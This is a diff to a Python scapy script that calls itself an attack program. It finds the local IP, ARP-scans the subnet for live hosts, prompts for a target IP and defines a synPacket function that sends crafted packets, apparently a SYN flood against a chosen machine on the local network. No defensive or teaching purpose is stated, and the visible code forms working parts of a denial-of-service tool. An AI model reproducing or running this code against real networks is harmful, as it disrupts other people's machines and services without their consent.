@@ -2,7 +2,7 @@ print('LOADING: program getting ready to attack...')
 
 
 import scapy.all as scapy
-import os,re, sys
+import sys, socket
 def getIps(hackerip):
     ipl = hackerip.split('.')
     ips = []
@@ -11,11 +11,24 @@ def getIps(hackerip):
     brodcustEther = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     packet = brodcustEther / arpRequest
 
-    result = scapy.srp(packet, timeout = 3, verbose = 0)[0]
+    result = scapy.srp(packet, timeout = 2, verbose = 0)[0]
     for sent, received  in result:
+        print(received.psrc)
         ips.append(received.psrc)
 
     return ips
+
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # doesn't even have to be reachable
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
 
 
 def synPacket(tragetIp, tragetPort, networkIp):
@@ -30,17 +43,14 @@ def synPacket(tragetIp, tragetPort, networkIp):
         scapy.send(packet, loop=0, verbose =0)
 
 
-
-
-
-
-
-addresses = os.popen('IPCONFIG | FINDSTR /R "Wireless LAN adapter WiFi .* Address.*[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*"')
-ip = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', addresses.read()).group()
-
+ip = get_ip()
 
 #starting the Attck
 ips = getIps(ip)
+
+if len(ips) == 0:
+    print('You have no one in your network who uses Arp protocol, Attack cant go on.')
+    sys.exit()
 ips.remove(ips[0])
 targetip = input('Enter Target IP: ')
 
